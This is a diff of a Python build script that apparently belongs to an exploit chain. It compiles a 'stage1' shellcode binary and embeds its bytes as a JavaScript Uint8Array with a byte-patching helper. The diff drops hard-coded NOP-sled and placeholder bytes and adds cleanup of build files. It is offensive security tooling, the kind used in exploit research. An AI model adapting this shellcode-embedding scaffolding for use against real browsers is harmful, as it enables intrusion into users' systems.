@@ -5,11 +5,11 @@ import subprocess
 subprocess.run(['make', 'all'], check=True)
 
 # Convert the payload to a JS array literal
-payload = open('stage1.bin', 'rb').read()
+payload = open('stage1', 'rb').read()
 
-js = 'var stage1 = new Uint8Array([144,144,144,144,144,144,144,144, 72, 191, 65, 65, 65, 65, 65, 65, 65, 65,'
+js = 'var stage1 = new Uint8Array(['
 js += ','.join(map(str, payload))
-js += ',144,144,144,144,144,144,144,144]);\n'
+js += ']);\n'
 js += '''
 stage1.replace = function(oldVal, newVal) {
     for (var idx = 0; idx < this.length; idx++) {
@@ -35,3 +35,8 @@ EXPORTS = [
 ]
 
 subprocess.run(['cp', 'stage1.js', '..'], check=True)
+subprocess.run(['rm', 'stage1.js'], check=True)
+subprocess.run(['rm', 'stage1.o'], check=True)
+subprocess.run(['rm', 'stage1_sc.h'], check=True)
+# subprocess.run(['rm', 'stage1.bin'], check=True)
+subprocess.run(['rm', 'stage1'], check=True)
